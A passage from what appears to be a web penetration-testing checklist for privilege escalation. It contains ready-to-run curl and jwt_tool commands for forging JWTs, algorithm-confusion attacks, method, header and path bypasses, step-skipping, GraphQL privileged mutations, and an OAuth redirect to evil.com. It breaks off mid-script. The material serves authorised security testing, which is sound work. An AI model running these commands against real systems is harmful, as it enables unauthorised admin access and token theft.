+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/graphql \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Authorization: Bearer $TOKEN&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;query&#34;: &#34;mutation UpdateUser($input: UpdateUserInput!) { updateUser(input: $input) { id role } }&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;variables&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      &#34;input&#34;: {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;id&#34;: &#34;myUserId&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;role&#34;: &#34;admin&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;isSuperUser&#34;: true
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    }
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  }&#39;</span>
+</span></span></code></pre></div><p><strong>Expected:</strong> Extra fields should be silently ignored or explicitly rejected. If the response confirms the role change, it&rsquo;s vulnerable.</p>
+<h3 id="5-jwt-manipulation">
+  5. JWT Manipulation
+  <a class="anchor" href="#5-jwt-manipulation">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether JWTs can be forged, tampered with, or have their signature verification bypassed.</p>
+<p><strong>Manual — Decode and inspect:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Decode</span> <span style="color:#a6e22e">JWT</span> (<span style="color:#a6e22e">base64</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">echo</span> <span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature&#34;</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">cut</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span>. <span style="color:#f92672">-</span><span style="color:#a6e22e">f2</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">/dev/null</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">algorithm</span> <span style="color:#a6e22e">none</span> <span style="color:#a6e22e">attack</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">python3</span> <span style="color:#a6e22e">jwt_tool</span>.<span style="color:#a6e22e">py</span> <span style="color:#a6e22e">$JWT</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">weak</span> <span style="color:#a6e22e">secret</span> <span style="color:#a6e22e">brute</span><span style="color:#f92672">-</span><span style="color:#a6e22e">force</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">python3</span> <span style="color:#a6e22e">jwt_tool</span>.<span style="color:#a6e22e">py</span> <span style="color:#a6e22e">$JWT</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">C</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">share</span><span style="color:#f92672">/</span><span style="color:#a6e22e">wordlists</span><span style="color:#f92672">/</span><span style="color:#a6e22e">rockyou</span>.<span style="color:#a6e22e">txt</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Forge</span> <span style="color:#a6e22e">token</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">modified</span> <span style="color:#a6e22e">claims</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">python3</span> <span style="color:#a6e22e">jwt_tool</span>.<span style="color:#a6e22e">py</span> <span style="color:#a6e22e">$JWT</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">T</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">S</span> <span style="color:#a6e22e">hs256</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">p</span> <span style="color:#e6db74">&#34;secret&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">pc</span> <span style="color:#a6e22e">role</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">pv</span> <span style="color:#a6e22e">admin</span>
+</span></span></code></pre></div><p><strong>Key confusion attack (RS256 → HS256):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Get</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">server</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">key</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">openssl</span> <span style="color:#a6e22e">s_client</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">:</span><span style="color:#ae81ff">443</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span><span style="color:#960050;background-color:#1e0010">/dev/null | openssl x509 -pubkey -noout &gt; pubkey.pem</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Sign</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">forged</span> <span style="color:#a6e22e">JWT</span> <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">the</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">key</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">HMAC</span> <span style="color:#a6e22e">secret</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">python3</span> <span style="color:#a6e22e">jwt_tool</span>.<span style="color:#a6e22e">py</span> <span style="color:#a6e22e">$JWT</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">pk</span> <span style="color:#a6e22e">pubkey</span>.<span style="color:#a6e22e">pem</span>
+</span></span></code></pre></div><p><strong>Tools:</strong> jwt_tool, jwt.io, hashcat (<code>-m 16500</code>), Burp JWT Editor extension.</p>
+<h3 id="6-http-method--header-bypass">
+  6. HTTP Method &amp; Header Bypass
+  <a class="anchor" href="#6-http-method--header-bypass">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether changing the HTTP method or adding override headers bypasses access controls.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Method</span> <span style="color:#a6e22e">switching</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">GET</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/admin/deleteUser?userId=123 \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$USER_SESSION&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">PUT</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/admin/deleteUser \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$USER_SESSION&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;userId&#34;: &#34;123&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Header</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">override</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/ \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Original-URL: /admin/deleteUser&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$USER_SESSION&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;userId=123&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">GET</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/ \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;X-Rewrite-URL: /admin/settings&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$USER_SESSION&#34;</span>
+</span></span></code></pre></div><h3 id="7-url-path-bypass">
+  7. URL Path Bypass
+  <a class="anchor" href="#7-url-path-bypass">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether URL manipulation circumvents path-based access control.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Case</span> <span style="color:#a6e22e">variation</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/ADMIN/SETTINGS -H &#34;Cookie: session=$TOKEN&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Trailing</span> <span style="color:#a6e22e">slash</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/admin/deleteUser/ -H &#34;Cookie: session=$TOKEN&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Double</span> <span style="color:#a6e22e">URL</span> <span style="color:#a6e22e">encoding</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/admin%252FdeleteUser&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Path</span> <span style="color:#a6e22e">traversal</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/user/../admin/settings&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Semicolon</span> <span style="color:#a6e22e">path</span> <span style="color:#a6e22e">parameter</span> (<span style="color:#a6e22e">Tomcat</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Java</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/admin;/deleteUser&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Null</span> <span style="color:#66d9ef">byte</span> (<span style="color:#a6e22e">legacy</span>)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/admin%00/deleteUser&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Spring</span> <span style="color:#a6e22e">suffix</span> <span style="color:#a6e22e">pattern</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/admin/deleteUser.json&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#e6db74">&#34;https://target.com/admin/deleteUser.css&#34;</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$TOKEN&#34;</span>
+</span></span></code></pre></div><h3 id="8-multi-step-process-bypass">
+  8. Multi-Step Process Bypass
+  <a class="anchor" href="#8-multi-step-process-bypass">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether skipping earlier steps of a multi-step process bypasses authorization on the final step.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Identify</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">multi</span><span style="color:#f92672">-</span><span style="color:#a6e22e">step</span> <span style="color:#a6e22e">admin</span> <span style="color:#a6e22e">action</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">g</span>., <span style="color:#a6e22e">user</span> <span style="color:#a6e22e">role</span> <span style="color:#a6e22e">change</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Step</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">users</span><span style="color:#f92672">/</span><span style="color:#ae81ff">123</span><span style="color:#f92672">/</span><span style="color:#a6e22e">edit</span> (<span style="color:#a6e22e">loads</span> <span style="color:#a6e22e">form</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Step</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">users</span><span style="color:#f92672">/</span><span style="color:#ae81ff">123</span><span style="color:#f92672">/</span><span style="color:#a6e22e">update</span> (<span style="color:#a6e22e">submits</span> <span style="color:#a6e22e">changes</span>)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Step</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">POST</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">admin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">users</span><span style="color:#f92672">/</span><span style="color:#ae81ff">123</span><span style="color:#f92672">/</span><span style="color:#a6e22e">confirm</span> (<span style="color:#a6e22e">confirms</span> <span style="color:#a6e22e">changes</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Skip</span> <span style="color:#a6e22e">steps</span> <span style="color:#ae81ff">1</span> <span style="color:#a6e22e">and</span> <span style="color:#ae81ff">2</span>, <span style="color:#a6e22e">directly</span> <span style="color:#a6e22e">hit</span> <span style="color:#a6e22e">step</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/admin/users/123/confirm \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Cookie: session=$REGULAR_USER_SESSION&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;action&#34;: &#34;changeRole&#34;, &#34;newRole&#34;: &#34;admin&#34;}&#39;</span>
+</span></span></code></pre></div><h3 id="9-graphql-introspection--authorization-testing">
+  9. GraphQL Introspection &amp; Authorization Testing
+  <a class="anchor" href="#9-graphql-introspection--authorization-testing">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether introspection reveals privileged operations and whether field-level authorization is enforced.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Check</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">introspection</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">enabled</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/graphql \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;{ __schema { queryType { name } mutationType { name } types { name fields { name } } } }&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Enumerate</span> <span style="color:#a6e22e">mutations</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/graphql \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;{ __schema { mutationType { fields { name args { name type { name } } } } } }&#34;}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attempt</span> <span style="color:#a6e22e">privileged</span> <span style="color:#a6e22e">mutation</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">low</span><span style="color:#f92672">-</span><span style="color:#a6e22e">privilege</span> <span style="color:#a6e22e">user</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">s</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">X</span> <span style="color:#a6e22e">POST</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/graphql \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Authorization: Bearer $LOW_PRIV_TOKEN&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> <span style="color:#f92672">\</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">d</span> <span style="color:#e6db74">&#39;{&#34;query&#34;:&#34;mutation { deleteUser(id: \&#34;admin123\&#34;) { success } }&#34;}&#39;</span>
+</span></span></code></pre></div><p><strong>Tools:</strong> Burp Suite, GraphQL Voyager, InQL (Burp extension), Altair GraphQL Client.</p>
+<h3 id="10-oauth--sso-testing">
+  10. OAuth &amp; SSO Testing
+  <a class="anchor" href="#10-oauth--sso-testing">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether OAuth scopes, consent screens, redirect URIs, and SSO flows can be manipulated for privilege escalation.</p>
+<p><strong>Manual:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">scope</span> <span style="color:#a6e22e">escalation</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Normal</span> <span style="color:#a6e22e">auth</span> <span style="color:#a6e22e">URL</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//auth.target.com/authorize?client_id=APP&amp;scope=read&amp;redirect_uri=https://app.com/callback
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Escalated</span> <span style="color:#a6e22e">scope</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//auth.target.com/authorize?client_id=APP&amp;scope=read+write+admin&amp;redirect_uri=https://app.com/callback
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">redirect</span> <span style="color:#a6e22e">URI</span> <span style="color:#a6e22e">manipulation</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//auth.target.com/authorize?client_id=APP&amp;scope=read&amp;redirect_uri=https://evil.com/callback
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Test</span> <span style="color:#a6e22e">SSO</span> <span style="color:#a6e22e">email</span> <span style="color:#a6e22e">confusion</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Register</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">non</span><span style="color:#f92672">-</span><span style="color:#a6e22e">SSO</span> <span style="color:#a6e22e">account</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">an</span> <span style="color:#a6e22e">email</span> <span style="color:#a6e22e">that</span> <span style="color:#a6e22e">matches</span> <span style="color:#a6e22e">an</span> <span style="color:#a6e22e">existing</span> <span style="color:#a6e22e">SSO</span> <span style="color:#a6e22e">user</span>
+</span></span></code></pre></div><h3 id="11-race-condition-privilege-escalation">
+  11. Race Condition Privilege Escalation
+  <a class="anchor" href="#11-race-condition-privilege-escalation">#</a>
+</h3>
+<p><strong>What to test:</strong> Whether sending concurrent requests to role-changing or verification endpoints can bypass checks.</p>
+<p><strong>Manual (Burp Turbo Intruder):</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Turbo</span> <span style="color:#a6e22e">Intruder</span> <span style="color:#a6e22e">script</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">race</span> <span style="color:#a6e22e">condition</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">queueRequests</span>(<span style="color:#a6e22e">target</span>, <span style="color:#a6e22e">wordlists</span>)<span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">engine</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">RequestEngine</span>(<span style="color:#a6e22e">endpoint</span><span style="color:#f92672">=</span><span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">endpoint</span>,
+</span></span><span style="display:flex;"><span>                          <span style="color:#a6e22e">concurrentConnections</span><span style="color:#f92672">=</span><span style="color:#ae81ff">30</span>,
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">requestsPerConnection</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>                          <span style="color:#a6e22e">pipeline</span><span style="color:#f92672">=</span><span style="color:#a6e22e">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">30</span>)<span style="color:#f92672">:</span>
